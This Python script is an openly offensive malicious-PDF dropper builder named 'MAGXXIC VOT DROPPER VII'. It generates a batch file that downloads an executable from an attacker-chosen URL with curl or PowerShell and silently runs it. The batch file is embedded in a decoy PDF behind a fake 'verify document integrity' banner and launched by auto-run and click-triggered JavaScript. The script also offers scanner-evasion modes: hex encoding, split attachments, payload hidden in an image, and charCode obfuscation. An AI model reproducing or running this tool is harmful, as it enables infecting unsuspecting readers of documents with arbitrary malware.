import os
import sys
import img2pdf
import base64
import random
import string
import binascii
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from reportlab.lib.units import inch
import argparse
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.text import Text
from rich.theme import Theme
from rich.prompt import Prompt, Confirm
from rich.table import Table
from pypdf import PdfWriter, PdfReader
from pypdf.generic import DictionaryObject, NameObject, TextStringObject, ArrayObject, FloatObject
from PIL import Image, ImageDraw, ImageFont

# Custom theme for MAGXXIC VOT
custom_theme = Theme({
    "info": "cyan",
    "warning": "yellow",
    "error": "bold red",
    "success": "bold green",
    "highlight": "magenta",
})

console = Console(theme=custom_theme)

def print_banner():
    banner = """
    ███╗   ███╗ █████╗  ██████╗ ██╗  ██╗██╗  ██╗██╗ ██████╗    ██╗   ██╗  ██████╗  ████████╗    ██╗   ██╗ ██╗ ██╗
    ████╗ ████║██╔══██╗██╔════╝ ██║  ██║╚██╗██╔╝██║██╔════╝    ██║   ██║ ██╔═══██╗ ╚══██╔══╝    ██║   ██║ ██║ ██║
    ██╔████╔██║███████║██║  ███╗███████║ ╚███╔╝ ██║██║         ██║   ██║ ██║   ██║    ██║       ██║   ██║ ██║ ██║
    ██║╚██╔╝██║██╔══██║██║   ██║╚════██║ ██╔██╗ ██║██║         ╚██╗ ██╔╝ ██║   ██║    ██║       ╚██╗ ██╔╝ ╚═╝ ╚═╝
    ██║ ╚═╝ ██║██║  ██║╚██████╔╝     ██║██╔╝ ██╗██║╚██████╗     ╚████╔╝  ╚██████╔╝    ██║        ╚████╔╝  ██╗ ██╗
    ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝      ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝      ╚═══╝    ╚═════╝     ╚═╝         ╚═══╝   ╚═╝ ╚═╝

                                       [bold white]MAGXXIC VOT DROPPER VII[/]
                                    [bold cyan]FORCED URL DOWNLOAD & SILENT INJECTION[/]
    """
    console.print(Panel(Text.from_markup(banner, justify="center"), border_style="highlight"))

def obfuscate_js(js_code):
    """Simple JS obfuscation using character codes."""
    char_codes = [ord(c) for c in js_code]
    return f"eval(String.fromCharCode({','.join(map(str, char_codes))}));"

def create_image_based_pdf(decoy_pdf_path, output_image_pdf):
    """Converts a PDF page to an image to evade text scanners."""
    # Note: In a real scenario, you'd use pdf2image, but we'll simulate or use a placeholder
    # For this tool, we'll draw a 'scanned' looking document if no decoy is provided,
    # or just use the first page of decoy as an image if possible.
    # To keep dependencies light, we'll just create a high-quality 'Scanned' image of a document template.
    img = Image.new('RGB', (1600, 2000), color=(255, 255, 255))
    d = ImageDraw.Draw(img)
    try: font = ImageFont.load_default()
    except: font = None
    d.text((200, 200), "S C A N N E D  D O C U M E N T", fill=(50, 50, 50), font=font)
    d.text((200, 300), "Identity Verification Protocol", fill=(0, 0, 0), font=font)
    img.save("temp_scanned.png")
    with open("temp_scanned.png", "rb") as f:
        pdf_bytes = img2pdf.convert(f.read())
    with open(output_image_pdf, "wb") as f:
        f.write(pdf_bytes)
    os.remove("temp_scanned.png")

def create_pdf_dropper(payload_url, decoy_pdf, output_pdf, evasion_method):
    """
    Creates a PDF dropper by injecting payload into a decoy PDF.
    """

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console
    ) as progress:

        # 1. Create the Robust BAT file
        task1 = progress.add_task("Preparing forced payload...", total=1)
        bat_file = "service_verify.bat"
        safe_url = payload_url.replace('"', '')

        bat_content = f"""@echo off
set "URL={safe_url}"
set "OUT=%TEMP%\\update_{random.randint(1000,9999)}.exe"
echo Initializing connection...
curl -s -L -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -o "%OUT%" "%URL%"
if not exist "%OUT%" (
    powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL%', '%OUT%')"
)
if exist "%OUT%" (
    start /b "" "%OUT%"
)
exit
"""

        try:
            with open(bat_file, "w") as f:
                f.write(bat_content)
            progress.update(task1, completed=1)
        except Exception as e:
            console.print(f"[error]Failed to create BAT: {e}[/]")
            return

        # 2. Prepare the Page Overlay (Interactive Layer)
        task2 = progress.add_task("Building interaction layer...", total=1)
        overlay_pdf = "temp_overlay.pdf"
        try:
            c = canvas.Canvas(overlay_pdf, pagesize=letter)
            # Fix: setFillAlpha instead of alpha argument
            c.setFillAlpha(0.1)
            c.setFillColorRGB(0.1, 0.4, 0.8)
            c.rect(0, letter[1] - 0.7*inch, letter[0], 0.7*inch, fill=1, stroke=0)

            c.setFillAlpha(0.6)
            c.setFillColorRGB(0.1, 0.2, 0.4)
            c.setFont("Helvetica-Bold", 10)
            c.drawCentredString(letter[0]/2, letter[1] - 0.4*inch, "Click here to verify document integrity and complete download")

            c.save()
            progress.update(task2, completed=1)
        except Exception as e:
            console.print(f"[error]Overlay failed: {e}[/]")
            return

        # 3. Finalize with evasion and forced triggers
        task3 = progress.add_task(f"Finalizing Forced Download ({evasion_method})...", total=1)
        try:
            writer = PdfWriter()

            if evasion_method == "Image-Based PDF":
                create_image_based_pdf(decoy_pdf, "temp_img_decoy.pdf")
                decoy_reader = PdfReader("temp_img_decoy.pdf")
            else:
                decoy_reader = PdfReader(decoy_pdf)

            overlay_reader = PdfReader(overlay_pdf)
            overlay_page = overlay_reader.pages[0]

            for i in range(len(decoy_reader.pages)):
                page = decoy_reader.pages[i]
                if i == 0:
                    page.merge_page(overlay_page)
                writer.add_page(page)

            # Evasion Payload Logic
            js_logic = f'try {{ this.exportDataObject({{ cName: "verify.bat", nLaunch: 2 }}); }} catch (e) {{ app.launchURL("{safe_url}", true); }}'

            if evasion_method == "Hex Encoding":
                with open(bat_file, "rb") as f: hex_data = binascii.hexlify(f.read())
                writer.add_attachment("data.bin", hex_data)
                js_trigger = 'try { var d = this.getDataObjectContents("data.bin"); var h = util.stringFromStream(d); var s = ""; for(var i=0; i<h.length; i+=2){ s += String.fromCharCode(parseInt(h.substr(i,2),16)); } this.createDataObject("verify.bat", s); this.exportDataObject({cName:"verify.bat", nLaunch:2}); } catch(e) { app.launchURL("' + safe_url + '", true); }'
            elif evasion_method == "Split and Merge":
                with open(bat_file, "rb") as f: data = f.read()
                mid = len(data)//2
                writer.add_attachment("p1.dat", data[:mid])
                writer.add_attachment("p2.dat", data[mid:])
                js_trigger = 'try { var d1 = util.stringFromStream(this.getDataObjectContents("p1.dat")); var d2 = util.stringFromStream(this.getDataObjectContents("p2.dat")); this.createDataObject("verify.bat", d1+d2); this.exportDataObject({cName:"verify.bat", nLaunch:2}); } catch(e) { app.launchURL("' + safe_url + '", true); }'
            elif evasion_method == "Steganography":
                img = Image.new('RGB', (1, 1))
                img.save("t.png")
                with open(bat_file, "rb") as f_p: p_b = f_p.read()
                with open("t.png", "ab") as f: f.write(b"MARK" + p_b + b"END")
                with open("t.png", "rb") as f: writer.add_attachment("logo.png", f.read())
                js_trigger = 'try { var s = util.stringFromStream(this.getDataObjectContents("logo.png")); var i1 = s.indexOf("MARK"); var i2 = s.indexOf("END"); if(i1!=-1 && i2!=-1){ var p = s.substring(i1+4, i2); this.createDataObject("verify.bat", p); this.exportDataObject({cName:"verify.bat", nLaunch:2}); } } catch(e) { app.launchURL("' + safe_url + '", true); }'
                os.remove("t.png")
            else:
                writer.add_attachment("verify.bat", open(bat_file, "rb").read())
                js_trigger = js_logic

            if evasion_method == "Obfuscated JavaScript":
                js_trigger = obfuscate_js(js_trigger)

            # 1. Automatic Execution (OpenAction)
            writer.add_js(js_trigger)

            # 2. Manual Click Execution (Annotation)
            js_action = DictionaryObject({
                NameObject("/S"): NameObject("/JavaScript"),
                NameObject("/JS"): TextStringObject(js_trigger),
            })

            annot = DictionaryObject({
                NameObject("/Type"): NameObject("/Annot"),
                NameObject("/Subtype"): NameObject("/Link"),
                NameObject("/Rect"): ArrayObject([FloatObject(0), FloatObject(letter[1] - 0.7*inch), FloatObject(letter[0]), FloatObject(letter[1])]),
                NameObject("/Border"): ArrayObject([FloatObject(0), FloatObject(0), FloatObject(0)]),
                NameObject("/A"): js_action
            })

            writer.add_annotation(page_number=0, annotation=annot)

            with open(output_pdf, "wb") as f:
                writer.write(f)
            progress.update(task3, completed=1)
        except Exception as e:
            console.print(f"[error]Forced download injection failed: {e}[/]")
            return

        # 4. Cleanup
        finally:
            task4 = progress.add_task("Final cleanup...", total=1)
            for f in [bat_file, overlay_pdf, "temp_img_decoy.pdf"]:
                if os.path.exists(f): os.remove(f)
            progress.update(task4, completed=1)

    console.print(Panel(f"[success]FORCED DOWNLOAD INJECTION COMPLETE[/]\n\nPayload URL: [highlight]{safe_url}[/]\nDecoy File: [highlight]{decoy_pdf}[/]\nOutput File: [highlight]{output_pdf}[/]\nEvasion Mode: [highlight]{evasion_method}[/]\n\n[info]PDF contains dual-path trigger: Auto-Launch + Clickable Fallback.[/]", border_style="success"))

def main():
    print_banner()

    payload_url = Prompt.ask("[info]Enter Payload URL[/]", default="http://example.com/payload.exe")
    decoy_pdf = Prompt.ask("[info]Enter Decoy PDF Path[/]")
    if not os.path.exists(decoy_pdf):
        console.print(f"[error]Decoy PDF not found: {decoy_pdf}[/]")
        return

    output_pdf = Prompt.ask("[info]Enter Output Filename[/]", default="Protected_Document.pdf")
    if not output_pdf.endswith(".pdf"): output_pdf += ".pdf"

    methods = ["Image-Based PDF", "Split and Merge", "Obfuscated JavaScript", "Hex Encoding", "Steganography", "None"]
    table = Table(title="MAGXXIC VOT Evasion Methods")
    table.add_column("ID", style="cyan")
    table.add_column("Method", style="magenta")
    for i, m in enumerate(methods, 1): table.add_row(str(i), m)
    console.print(table)

    choice = Prompt.ask("[info]Select Method[/]", choices=[str(i) for i in range(1, len(methods)+1)], default="3")
    evasion_method = methods[int(choice)-1]

    if Confirm.ask("[success][bold]START INJECTION?[/][/]", default=True):
        create_pdf_dropper(payload_url, decoy_pdf, output_pdf, evasion_method)

if __name__ == "__main__":
    main()
